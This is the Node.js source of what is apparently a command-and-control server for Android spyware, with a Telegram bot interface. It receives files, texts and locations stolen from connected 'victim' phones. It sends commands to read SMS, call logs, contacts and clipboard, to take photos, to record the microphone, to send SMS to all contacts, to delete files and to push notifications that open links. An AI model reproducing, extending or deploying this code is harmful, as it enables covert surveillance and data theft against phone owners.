process.env.NTBA_FIX_350 = 1; 
process.env.NTBA_FIX_319 = 1; 

const express = require('express');
const webSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
require('dotenv').config();

const token = process.env.TOKEN;
const adminId = process.env.ID;
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new TelegramBot(token, { polling: true });
const appClients = new Map();

// --- SERVER LIMITS EXTREMELY INCREASED ---
appServer.timeout = 600000; // 10 Minutes timeout for large file uploads
const upload = multer({ limits: { fileSize: 100 * 1024 * 1024 } }).single('file'); // Up to 100MB
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
  res.send('<h1 align="center">Advanced Fuse System Running 100% Perfectly</h1>');
});

// ==========================================
// 📥 ADVANCED UPLOAD MANAGER WITH LOGGING
// ==========================================
app.post('/uploadFile', (req, res) => {
  upload(req, res, function (err) {
    if (err) {
      console.log('❌ [FILE UPLOAD ERROR]:', err.message);
      return res.status(500).send('Upload Failed');
    }
    if (!req.file) {
      console.log('⚠️ [WARNING]: Client pinged /uploadFile but no file was attached.');
      return res.status(400).send('');
    }

    const fileName = req.file.originalname || 'received_data.unknown';
    console.log(`✅ [FILE RECEIVED]: ${fileName} | Size: ${(req.file.size / 1024 / 1024).toFixed(2)} MB`);

    appBot.sendDocument(
      adminId,
      req.file.buffer,
      {
        caption: `°• 📁 <b>Data Received from Device</b>\n\n• Device: <b>${req.headers.model || 'Unknown'}</b>\n• File Size: ${(req.file.size / 1024 / 1024).toFixed(2)} MB`,
        parse_mode: 'HTML',
      },
      {
        filename: fileName,
        contentType: req.file.mimetype || 'application/octet-stream',
      }
    ).then(() => {
        console.log(`🚀 [SUCCESS]: ${fileName} forwarded to Telegram.`);
    }).catch(apiErr => {
        console.log('❌ [TELEGRAM SEND ERROR]: File too large or network timeout.', apiErr.message);
    });

    res.status(200).send('');
  });
});

app.post('/uploadText', (req, res) => {
  appBot.sendMessage(
    adminId,
    `°• 📄 <b>Text Data Received</b>\n• Device: <b>${req.headers.model || 'Unknown'}</b>\n\n${req.body.text}`,
    { parse_mode: 'HTML' }
  );
  res.send('');
});

app.post('/uploadLocation', (req, res) => {
  appBot.sendLocation(adminId, req.body.lat, req.body.lon);
  appBot.sendMessage(
    adminId,
    `°• 📍 <b>Live Location Received</b>\n• Device: <b>${req.headers.model || 'Unknown'}</b>`,
    { parse_mode: 'HTML' }
  );
  res.send('');
});

// ==========================================
// 🔌 WEBSOCKET CONNECTION MANAGER
// ==========================================
appSocket.on('connection', (socket, req) => {
  const userUuid = uuid4.v4();
  socket.uuid = userUuid;
  
  appClients.set(userUuid, {
    model: req.headers.model || 'Unknown Device',
    battery: req.headers.battery || 'N/A',
    version: req.headers.version || 'N/A',
    brightness: req.headers.brightness || 'N/A',
    provider: req.headers.provider || 'N/A',
  });

  console.log(`📱 [NEW DEVICE]: ${req.headers.model || 'Unknown'} Connected!`);

  appBot.sendMessage(
    adminId,
    `°• 🟢 <b>NEW DEVICE CONNECTED</b>\n\n` +
      `• Device Model : <b>${req.headers.model || 'Unknown'}</b>\n` +
      `• Battery : <b>${req.headers.battery || 'Unknown'}</b>\n` +
      `• Android Version : <b>${req.headers.version || 'Unknown'}</b>\n` +
      `• Brightness : <b>${req.headers.brightness || 'Unknown'}</b>\n` +
      `• Provider : <b>${req.headers.provider || 'Unknown'}</b>`,
    { parse_mode: 'HTML' }
  );

  socket.on('close', function () {
    appBot.sendMessage(
      adminId,
      `°• 🔴 <b>DEVICE DISCONNECTED</b>\n\n• Device Model : <b>${req.headers.model || 'Unknown'}</b>`,
      { parse_mode: 'HTML' }
    );
    appClients.delete(socket.uuid);
    console.log(`🔌 [DISCONNECTED]: ${req.headers.model || 'Unknown'}`);
  });
});

// ==========================================
// 🤖 TELEGRAM BOT CONTROLLER & REPLIES
// ==========================================
function sendWaitMessage() {
    appBot.sendMessage(
        adminId,
        '⏳ <b>Command Sent Successfully!</b>\n\nWait a few moments, the device will respond shortly...',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              ['💻 Connected Devices', '⚙️ Commands Menu']
            ],
            resize_keyboard: true,
          },
        }
      );
}

appBot.on('message', (msg) => {
  const chatId = msg.chat.id;

  // Protect bot access
  if (chatId != adminId) {
     return appBot.sendMessage(chatId, '🚫 Unauthorized Access.');
  }

  // --- REPLY HANDLERS ---
  if (msg.reply_to_message) {
    const replyText = msg.reply_to_message.text;

    if (replyText.includes('°• 📁 File Explorer')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid == currentUuid) client.send('file_explorer:' + msg.text);
        });
        currentUuid = '';
        return sendWaitMessage();
    }
    
    if (replyText.includes('°• 📱 Send SMS (Number)')) {
      currentNumber = msg.text;
      appBot.sendMessage(adminId, '°• 💬 Now enter the Message you want to send:', { reply_markup: { force_reply: true } });
      return;
    }
    if (replyText.includes('°• 💬 Now enter the Message')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send(`send_message:${currentNumber}/${msg.text}`);
      });
      currentNumber = ''; currentUuid = '';
      return sendWaitMessage();
    }
    
    if (replyText.includes('°• 📢 Send SMS to All')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('send_message_to_all:' + msg.text);
      });
      currentUuid = '';
      return sendWaitMessage();
    }
    
    if (replyText.includes('°• 📥 Download File Path')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('file:' + msg.text);
      });
      currentUuid = '';
      return sendWaitMessage();
    }

    if (replyText.includes('°• 🗑 Delete File Path')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('delete_file:' + msg.text);
      });
      currentUuid = '';
      return sendWaitMessage();
    }

    if (replyText.includes('°• 🎤 Enter Recording Time')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('microphone:' + msg.text);
      });
      currentUuid = '';
      return sendWaitMessage();
    }

    if (replyText.includes('°• 💬 Enter Toast Message')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('toast:' + msg.text);
      });
      currentUuid = '';
      return sendWaitMessage();
    }

    if (replyText.includes('°• 🔔 Notification Title')) {
      currentTitle = msg.text;
      appBot.sendMessage(adminId, '°• 🔗 Notification Link (URL to open):', { reply_markup: { force_reply: true } });
      return;
    }
    if (replyText.includes('°• 🔗 Notification Link')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send(`show_notification:${currentTitle}/${msg.text}`);
      });
      currentUuid = '';
      return sendWaitMessage();
    }

    if (replyText.includes('°• 🎵 Enter Audio URL')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('play_audio:' + msg.text);
      });
      currentUuid = '';
      return sendWaitMessage();
    }
  }

  // --- STANDARD COMMANDS ---
  if (msg.text === '/start') {
    appBot.sendMessage(
      adminId,
      '🎯 <b>Welcome to Advance Fuse System</b>\n\n• The server is online and running on 100% capacity.\n• Wait for victims to connect.',
      {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            ['💻 Connected Devices', '⚙️ Commands Menu'],
          ],
          resize_keyboard: true,
        },
      }
    );
  }

  if (msg.text === '💻 Connected Devices') {
    if (appClients.size === 0) {
      appBot.sendMessage(adminId, '⚠️ No devices connected right now.');
    } else {
      let msgText = '<b>💻 LIVE CONNECTED DEVICES:</b>\n\n';
      appClients.forEach((clientData) => {
        msgText += `• <b>${clientData.model}</b> | 🔋 ${clientData.battery} | ⚡️ Android ${clientData.version}\n`;
      });
      appBot.sendMessage(adminId, msgText, { parse_mode: 'HTML' });
    }
  }

  if (msg.text === '⚙️ Commands Menu') {
    if (appClients.size === 0) {
      appBot.sendMessage(adminId, '⚠️ No devices connected right now.');
    } else {
      const keyboardOptions = [];
      appClients.forEach((clientData, clientId) => {
        keyboardOptions.push([{ text: `📱 Manage: ${clientData.model}`, callback_data: 'device:' + clientId }]);
      });
      appBot.sendMessage(adminId, '°• <b>Select a Device to Control:</b>', { 
          reply_markup: { inline_keyboard: keyboardOptions },
          parse_mode: 'HTML' 
      });
    }
  }
});

// ==========================================
// 🎛 PREMIUM UI INLINE KEYBOARD MANAGER
// ==========================================
appBot.on('callback_query', (cbQuery) => {
  const msg = cbQuery.message;
  const data = cbQuery.data;
  const cmdType = data.split(':')[0];
  const targetUuid = data.split(':')[1];
  
  if (cmdType === 'device') {
    appBot.editMessageText(
      `°• <b>Control Panel</b>: 📱 <b>${appClients.get(targetUuid)?.model || 'Unknown'}</b>\nSelect an action below:`,
      {
        chat_id: adminId,
        message_id: msg.message_id,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            // Row 1 - NEW FILE EXPLORER FEATURE added
            [{ text: '📁 File Explorer', callback_data: 'file_explorer:' + targetUuid }],
            // Row 2
            [{ text: '📥 Get File', callback_data: 'file:' + targetUuid }, { text: '🗑 Delete File', callback_data: 'delete_file:' + targetUuid }],
            // Row 3
            [{ text: '🎤 Mic Record', callback_data: 'microphone:' + targetUuid }, { text: '🔊 Play Audio', callback_data: 'play_audio:' + targetUuid }],
            // Row 4
            [{ text: '📸 Main Cam', callback_data: 'camera_main:' + targetUuid }, { text: '🤳 Selfie Cam', callback_data: 'camera_selfie:' + targetUuid }],
            // Row 5
            [{ text: '📍 Location', callback_data: 'location:' + targetUuid }, { text: '📳 Vibrate', callback_data: 'vibrate:' + targetUuid }],
            // Row 6
            [{ text: '📞 Calls Log', callback_data: 'calls:' + targetUuid }, { text: '📇 Contacts', callback_data: 'contacts:' + targetUuid }],
            // Row 7
            [{ text: '✉️ Read SMS', callback_data: 'messages:' + targetUuid }, { text: '📱 App List', callback_data: 'apps:' + targetUuid }],
            // Row 8
            [{ text: '💬 Send Toast', callback_data: 'toast:' + targetUuid }, { text: '🔔 Notification', callback_data: 'show_notification:' + targetUuid }],
            // Row 9
            [{ text: 'ℹ️ Device Info', callback_data: 'device_info:' + targetUuid }, { text: '📋 Clipboard', callback_data: 'clipboard:' + targetUuid }],
            // Row 10
            [{ text: '✉️ Send SMS', callback_data: 'send_message:' + targetUuid }, { text: '📢 SMS to All', callback_data: 'send_message_to_all:' + targetUuid }],
            // Row 11
            [{ text: '🔇 Stop Audio', callback_data: 'stop_audio:' + targetUuid }]
          ],
        },
      }
    );
  }

  // Handle instant push commands
  const directCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];
  
  if (directCommands.includes(cmdType)) {
    appSocket.clients.forEach((client) => {
      if (client.uuid === targetUuid) client.send(cmdType);
    });
    appBot.deleteMessage(adminId, msg.message_id);
    sendWaitMessage();
  }

  // --- Handle Force Reply Commands ---
  const replyMap = {
    'file_explorer': '°• 📁 File Explorer - Path Enter Karo:\n\nExample: DCIM/Camera ya Download',
    'send_message': '°• 📱 Send SMS (Number):\nEnter target mobile number.',
    'send_message_to_all': '°• 📢 Send SMS to All:\nEnter message to send to everyone.',
    'file': '°• 📥 Download File Path:\nExample: DCIM/Camera/photo.jpg',
    'delete_file': '°• 🗑 Delete File Path:\nExample: Download/virus.apk',
    'microphone': '°• 🎤 Enter Recording Time (in Seconds):\nExample: 15',
    'toast': '°• 💬 Enter Toast Message:',
    'show_notification': '°• 🔔 Notification Title:',
    'play_audio': '°• 🎵 Enter Audio URL (Direct link):'
  };

  if (replyMap[cmdType]) {
    appBot.deleteMessage(adminId, msg.message_id);
    appBot.sendMessage(adminId, replyMap[cmdType], { reply_markup: { force_reply: true } });
    currentUuid = targetUuid;
  }
});

// ==========================================
// 🔄 SMART PING KEEPALIVE 
// ==========================================
// Ye render server ko sleep hone se rokega, aur sockets zinda rakhega
setInterval(function () {
  appSocket.clients.forEach(function (client) {
    if (client.readyState === webSocket.OPEN) {
      client.send('ping');
    }
  });

  const myUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 8999}`;
  axios.get(myUrl).catch(() => {});
}, 10000); // Changed to 10s to lower API stress but maintain stability

appServer.listen(process.env.PORT || 8999, () => {
    console.log("🔥 System Core Started Successfully!");
});
